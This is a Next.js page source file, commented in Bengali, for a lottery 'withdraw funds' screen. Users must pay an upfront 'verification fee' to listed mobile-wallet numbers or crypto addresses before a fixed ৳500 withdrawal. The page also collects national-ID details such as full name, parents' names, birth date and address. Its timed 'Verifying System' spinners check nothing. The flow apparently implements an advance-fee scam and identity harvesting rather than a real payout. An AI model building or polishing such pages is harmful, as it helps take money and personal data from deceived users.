/* app/lottery/withdraw/page.tsx */
"use client";

import { useCallback, useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";
import { createClient } from "../../../lib/supabase/client";
import "./withdraw.css";

export default function LotteryWithdrawPage() {
  const router = useRouter();
  const supabase = useMemo(() => createClient(), []);

  const [balance, setBalance] = useState(0);
  const [fees, setFees] = useState({
    managing_cost: 0, team_cost: 0, processing_cost: 0, vat_percentage: 0
  });
  const [paymentMethods, setPaymentMethods] = useState<any[]>([]);
  
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [modalStep, setModalStep] = useState(1);

  // ================= নতুন যোগ করা স্টেট =================
  const [isModalLoading, setIsModalLoading] = useState(false); // মডাল ওপেন লোডিং
  const [showSuccessPopup, setShowSuccessPopup] = useState(false); // সাকসেস পপআপ
  // ======================================================

  // NID ফর্ম ডাটা
  const [formData, setFormData] = useState({
    full_name: "",
    father_name: "",
    mother_name: "",
    mobile: "",
    full_address: "",
    birth_date: "",
    zip_code: "",
    district: ""
  });

  // পেমেন্ট ফর্ম ডাটা
  const [paymentData, setPaymentData] = useState({
    method_code: "",
    bank_trx_id: ""
  });

  const [loading, setLoading] = useState(true);
  const [submitting, setSubmitting] = useState(false);
  const [message, setMessage] = useState({ type: "", text: "" });

  const withdrawalAmount = 500; 

  const loadData = useCallback(async () => {
    setLoading(true);
    try {
      const { data: { user } } = await supabase.auth.getUser();
      if (!user) { router.replace("/signup/"); return; }

      const { data: profile } = await supabase.from("profiles").select("lottery_balance").eq("id", user.id).single();
      if (profile) setBalance(Number(profile.lottery_balance) || 0);

      const { data: feeData } = await supabase.from("platform_settings").select("*").eq("id", 1).single();
      if (feeData) setFees(feeData);

      const { data: methods } = await supabase.from("payment_methods").select("*").eq("withdrawal_enabled", true);
      if (methods) setPaymentMethods(methods);

      const { data: userDetails } = await supabase.from("lottery_user_details").select("*").eq("user_id", user.id).maybeSingle();
      if (userDetails) {
        setFormData({
          full_name: userDetails.full_name || "",
          father_name: userDetails.father_name || "",
          mother_name: userDetails.mother_name || "",
          mobile: userDetails.mobile || "",
          full_address: userDetails.full_address || "",
          birth_date: userDetails.birth_date || "",
          zip_code: userDetails.zip_code || "",
          district: userDetails.district || ""
        });
      }
      
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  }, [router, supabase]);

  useEffect(() => { void loadData(); }, [loadData]);

  const vatAmount = (withdrawalAmount * (Number(fees.vat_percentage) / 100));
  const totalFee = Number(fees.managing_cost) + Number(fees.team_cost) + Number(fees.processing_cost) + vatAmount;

  // Complete Verification বাটনে ক্লিক করলে লোডিং সহ মডাল ওপেন হবে
  const handleOpenModal = () => {
    setMessage({ type: "", text: "" });
    setModalStep(1);
    setIsModalOpen(true);
    setIsModalLoading(true); // লোডিং শুরু

    // ১.৫ সেকেন্ড পর লোডিং শেষ হয়ে ফর্ম দেখাবে (আপনি ইচ্ছেমতো সময় বাড়াতে/কমাতে পারেন)
    setTimeout(() => {
      setIsModalLoading(false);
    }, 1500);
  };

  const handleProceedToPayment = (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.full_name || !formData.mobile || !formData.full_address) {
      setMessage({ type: "error", text: "Please fill the required NID details." });
      return;
    }
    setMessage({ type: "", text: "" });
    setModalStep(2); 
  };

  const handleFinalSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!paymentData.method_code || !paymentData.bank_trx_id) {
      setMessage({ type: "error", text: "Please select a method and enter TrxID." });
      return;
    }

    setSubmitting(true);
    setMessage({ type: "", text: "" });

    try {
      const { data: { user } } = await supabase.auth.getUser();
      if (!user) throw new Error("Not logged in");

      const { error: userError } = await supabase.from("lottery_user_details").upsert({
        user_id: user.id,
        mobile: formData.mobile,
        full_name: formData.full_name,
        father_name: formData.father_name,
        mother_name: formData.mother_name,
        full_address: formData.full_address,
        birth_date: formData.birth_date || null,
        zip_code: formData.zip_code,
        district: formData.district,
        updated_at: new Date().toISOString()
      }, { onConflict: 'user_id' });

      if (userError) throw new Error("Failed to save user details: " + userError.message);

      const { error: withdrawError } = await supabase.from("withdrawal_verifications").insert({
        user_id: user.id,
        amount: withdrawalAmount,
        managing_cost: fees.managing_cost,
        team_cost: fees.team_cost,
        processing_cost: fees.processing_cost,
        vat: vatAmount,
        total_fee: totalFee,
        net_amount: withdrawalAmount - totalFee,
        method: paymentData.method_code,
        account_number: formData.mobile, 
        bank_trx_id: paymentData.bank_trx_id,
        status: "pending"
      });

      if (withdrawError) throw withdrawError;

      // ================= সাকসেস পপআপ অ্যানিমেশন =================
      setShowSuccessPopup(true);
      
      // ৩ সেকেন্ড পর পপআপ বন্ধ হবে এবং মডাল ক্লোজ হবে
      setTimeout(() => {
        setShowSuccessPopup(false);
        setIsModalOpen(false);
        setModalStep(1);
        setPaymentData({ method_code: "", bank_trx_id: "" });
      }, 3000);
      // ==========================================================
      
    } catch (err: any) {
      setMessage({ type: "error", text: err.message || "Something went wrong!" });
    } finally {
      setSubmitting(false);
    }
  };

  // ================= ১. পেইজ লোডিং অ্যানিমেশন (Verification + Payment Icon) =================
  if (loading) return (
    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', height: '80vh', backgroundColor: '#130a24', color: '#d4af37' }}>
      <div style={{ display: 'flex', gap: '20px', marginBottom: '20px' }}>
        <i className="fa-solid fa-id-card" style={{ fontSize: '40px', animation: 'float 1.5s ease-in-out infinite' }}></i>
        <i className="fa-solid fa-money-bill-wave" style={{ fontSize: '40px', color: '#51cf66', animation: 'float 1.5s ease-in-out infinite 0.5s' }}></i>
      </div>
      <h2 style={{ fontSize: '18px', fontWeight: 'normal' }}>Verifying System...</h2>
    </div>
  );
  // =========================================================================================

  return (
    <div className="lot-withdraw-page">
      {/* CSS Keyframes Injection for Animations */}
      <style>{`
        @keyframes float {
          0% { transform: translateY(0px); }
          50% { transform: translateY(-15px); }
          100% { transform: translateY(0px); }
        }
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        @keyframes popIn {
          0% { transform: scale(0.5); opacity: 0; }
          100% { transform: scale(1); opacity: 1; }
        }
        .custom-spinner {
          border: 4px solid rgba(212, 175, 55, 0.2);
          border-top: 4px solid #d4af37;
          border-radius: 50%;
          width: 40px;
          height: 40px;
          animation: spin 1s linear infinite;
        }
      `}</style>

      <h1 className="lot-page-title">Withdraw Funds</h1>
      
      {message.text && !isModalOpen && (
        <div className={`lot-alert ${message.type}`}>{message.text}</div>
      )}

      <div className="lot-balance-display">
        <span>Lottery Available Balance</span>
        <strong>৳ {balance.toFixed(2)}</strong>
      </div>

      <div className="lot-form-card">
        <div className="lot-fee-breakdown">
          <h4><i className="fa-solid fa-circle-info"></i> Verification Fee Breakdown</h4>
          <div className="fee-row"><span>Managing Cost:</span> <span>৳{fees.managing_cost}</span></div>
          <div className="fee-row"><span>Team Cost:</span> <span>৳{fees.team_cost}</span></div>
          <div className="fee-row"><span>Processing Cost:</span> <span>৳{fees.processing_cost}</span></div>
          <div className="fee-row"><span>VAT ({fees.vat_percentage}%):</span> <span>৳{vatAmount.toFixed(2)}</span></div>
          <div className="fee-row total"><span>Total Fee:</span> <span className="text-gold">৳{totalFee.toFixed(2)}</span></div>
          <p style={{marginTop: '10px', fontSize: '14px', color: '#ccc'}}>
            Withdrawal Amount: ৳{withdrawalAmount}
          </p>
        </div>

        <button 
          onClick={handleOpenModal} 
          className="lot-submit-btn"
          style={{ marginTop: '20px' }}
        >
          Complete Verification
        </button>
      </div>

      {/* মডাল (Popup) */}
      {isModalOpen && (
        <div className="lot-modal-overlay" style={{
          position: 'fixed', top: 0, left: 0, right: 0, bottom: 0,
          backgroundColor: 'rgba(0,0,0,0.8)', display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 1000
        }}>
          <div className="lot-modal-content" style={{
            backgroundColor: '#2a1f3d', padding: '20px', borderRadius: '10px', width: '90%', maxWidth: '400px',
            border: '1px solid #d4af37', maxHeight: '90vh', overflowY: 'auto'
          }}>
            
            {/* ================= ২. মডাল ওপেন লোডিং অ্যানিমেশন ================= */}
            {isModalLoading ? (
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', padding: '40px 0' }}>
                <div className="custom-spinner"></div>
                <p style={{ marginTop: '20px', color: '#aaa', fontSize: '14px' }}>Fetching Payment Details...</p>
              </div>
            ) : (
              // লোডিং শেষ হলে মূল ফর্ম দেখাবে
              <>
                {message.text && (
                  <div className={`lot-alert ${message.type}`} style={{ marginBottom: '15px', color: message.type === 'error' ? '#ff6b6b' : '#51cf66', fontSize: '14px' }}>
                    {message.text}
                  </div>
                )}

                {modalStep === 1 && (
                  <>
                    <h3 style={{ color: '#d4af37', marginBottom: '15px' }}>NID Verification</h3>
                    <p style={{ fontSize: '14px', marginBottom: '15px', color: '#aaa' }}>
                      Please provide your real NID information to proceed.
                    </p>

                    <form onSubmit={handleProceedToPayment}>
                      <div className="lot-input-group" style={{ marginBottom: '10px' }}>
                        <label>Full Name (as per NID)</label>
                        <input type="text" value={formData.full_name} onChange={e => setFormData({...formData, full_name: e.target.value})} placeholder="Your Full Name" required style={{ padding: '10px', borderRadius: '5px', width: '100%', backgroundColor: '#1a1129', color: 'white', border: '1px solid #444' }} />
                      </div>

                      <div className="lot-input-group" style={{ marginBottom: '10px' }}>
                        <label>Mobile Number</label>
                        <input type="text" value={formData.mobile} onChange={e => setFormData({...formData, mobile: e.target.value})} placeholder="01XXXXXXXXX" required style={{ padding: '10px', borderRadius: '5px', width: '100%', backgroundColor: '#1a1129', color: 'white', border: '1px solid #444' }} />
                      </div>

                      <div className="lot-input-group" style={{ marginBottom: '10px' }}>
                        <label>Father's Name</label>
                        <input type="text" value={formData.father_name} onChange={e => setFormData({...formData, father_name: e.target.value})} placeholder="Father's Name" style={{ padding: '10px', borderRadius: '5px', width: '100%', backgroundColor: '#1a1129', color: 'white', border: '1px solid #444' }} />
                      </div>

                      <div className="lot-input-group" style={{ marginBottom: '10px' }}>
                        <label>Mother's Name</label>
                        <input type="text" value={formData.mother_name} onChange={e => setFormData({...formData, mother_name: e.target.value})} placeholder="Mother's Name" style={{ padding: '10px', borderRadius: '5px', width: '100%', backgroundColor: '#1a1129', color: 'white', border: '1px solid #444' }} />
                      </div>

                      <div className="lot-input-group" style={{ marginBottom: '10px' }}>
                        <label>Birth Date</label>
                        <input type="date" value={formData.birth_date} onChange={e => setFormData({...formData, birth_date: e.target.value})} style={{ padding: '10px', borderRadius: '5px', width: '100%', backgroundColor: '#1a1129', color: 'white', border: '1px solid #444' }} />
                      </div>

                      <div style={{ display: 'flex', gap: '10px', marginBottom: '10px' }}>
                        <div className="lot-input-group" style={{ flex: 1 }}>
                          <label>District</label>
                          <input type="text" value={formData.district} onChange={e => setFormData({...formData, district: e.target.value})} placeholder="District" style={{ padding: '10px', borderRadius: '5px', width: '100%', backgroundColor: '#1a1129', color: 'white', border: '1px solid #444' }} />
                        </div>
                        <div className="lot-input-group" style={{ flex: 1 }}>
                          <label>Zip Code</label>
                          <input type="text" value={formData.zip_code} onChange={e => setFormData({...formData, zip_code: e.target.value})} placeholder="Zip Code" style={{ padding: '10px', borderRadius: '5px', width: '100%', backgroundColor: '#1a1129', color: 'white', border: '1px solid #444' }} />
                        </div>
                      </div>

                      <div className="lot-input-group" style={{ marginBottom: '10px' }}>
                        <label>Full Address</label>
                        <textarea value={formData.full_address} onChange={e => setFormData({...formData, full_address: e.target.value})} placeholder="Your Full Address" required rows={2} style={{ padding: '10px', borderRadius: '5px', width: '100%', backgroundColor: '#1a1129', color: 'white', border: '1px solid #444' }} />
                      </div>

                      <div style={{ display: 'flex', gap: '10px', marginTop: '20px' }}>
                        <button type="button" onClick={() => setIsModalOpen(false)} style={{ flex: 1, padding: '10px', backgroundColor: '#555', color: 'white', borderRadius: '5px', border: 'none' }}>Cancel</button>
                        <button type="submit" style={{ flex: 1, padding: '10px', backgroundColor: '#d4af37', color: 'black', fontWeight: 'bold', borderRadius: '5px', border: 'none' }}>
                          Proceed to Pay ৳{totalFee.toFixed(2)}
                        </button>
                      </div>
                    </form>
                  </>
                )}

                {modalStep === 2 && (
                  <>
                    <h3 style={{ color: '#d4af37', marginBottom: '15px' }}>Payment Verification</h3>
                    <div style={{ backgroundColor: '#1a1129', padding: '10px', borderRadius: '5px', marginBottom: '15px', textAlign: 'center' }}>
                      <p style={{ fontSize: '13px', color: '#aaa', marginBottom: '5px' }}>Total Amount to Pay</p>
                      <h2 style={{ color: '#d4af37', margin: 0 }}>৳{totalFee.toFixed(2)}</h2>
                    </div>

                    <p style={{ fontSize: '14px', marginBottom: '15px' }}>
                      Please send the amount to any of the numbers below:
                    </p>

                    <div style={{ marginBottom: '15px' }}>
                      {paymentMethods.map((pm) => (
                        <div key={pm.id} style={{ backgroundColor: '#1a1129', padding: '10px', borderRadius: '5px', marginBottom: '5px', display: 'flex', justifyContent: 'space-between' }}>
                          <span>{pm.method_name}</span>
                          <strong style={{ color: '#d4af37' }}>{pm.payment_number || pm.usdt_address}</strong>
                        </div>
                      ))}
                    </div>

                    <form onSubmit={handleFinalSubmit}>
                      <div className="lot-input-group" style={{ marginBottom: '10px' }}>
                        <label>Select Payment Method</label>
                        <select 
                          value={paymentData.method_code} 
                          onChange={e => setPaymentData({...paymentData, method_code: e.target.value})} 
                          required
                          style={{ padding: '10px', borderRadius: '5px', width: '100%', backgroundColor: '#1a1129', color: 'white', border: '1px solid #444' }}
                        >
                          <option value="">Select Method</option>
                          {paymentMethods.map(pm => (
                            <option key={pm.id} value={pm.method_code}>{pm.method_name}</option>
                          ))}
                        </select>
                      </div>

                      <div className="lot-input-group" style={{ marginBottom: '10px' }}>
                        <label>Transaction ID (TrxID)</label>
                        <input 
                          type="text" 
                          value={paymentData.bank_trx_id} 
                          onChange={e => setPaymentData({...paymentData, bank_trx_id: e.target.value})} 
                          placeholder="Enter TrxID" 
                          required 
                          style={{ padding: '10px', borderRadius: '5px', width: '100%', backgroundColor: '#1a1129', color: 'white', border: '1px solid #444' }}
                        />
                      </div>

                      <div style={{ display: 'flex', gap: '10px', marginTop: '20px' }}>
                        <button type="button" onClick={() => setModalStep(1)} style={{ flex: 1, padding: '10px', backgroundColor: '#555', color: 'white', borderRadius: '5px', border: 'none' }}>Back</button>
                        <button type="submit" disabled={submitting} style={{ flex: 1, padding: '10px', backgroundColor: '#d4af37', color: 'black', fontWeight: 'bold', borderRadius: '5px', border: 'none' }}>
                          {submitting ? "Submitting..." : "Submit"}
                        </button>
                      </div>
                    </form>
                  </>
                )}
              </>
            )}

          </div>
        </div>
      )}

      {/* ================= ৩. সাকসেস পপ-আপ অ্যানিমেশন ================= */}
      {showSuccessPopup && (
        <div style={{ 
          position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, 
          backgroundColor: 'rgba(0,0,0,0.85)', display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 2000 
        }}>
          <div style={{ 
            backgroundColor: '#2a1f3d', padding: '30px', borderRadius: '15px', textAlign: 'center', 
            border: '2px solid #51cf66', animation: 'popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275)' 
          }}>
            <i className="fa-solid fa-circle-check" style={{ fontSize: '60px', color: '#51cf66', marginBottom: '15px' }}></i>
            <h2 style={{ color: 'white', marginBottom: '10px', marginTop: 0 }}>Success!</h2>
            <p style={{ color: '#aaa', margin: 0 }}>Your request has been submitted successfully.</p>
          </div>
        </div>
      )}
      {/* =============================================================== */}

    </div>
  );
}
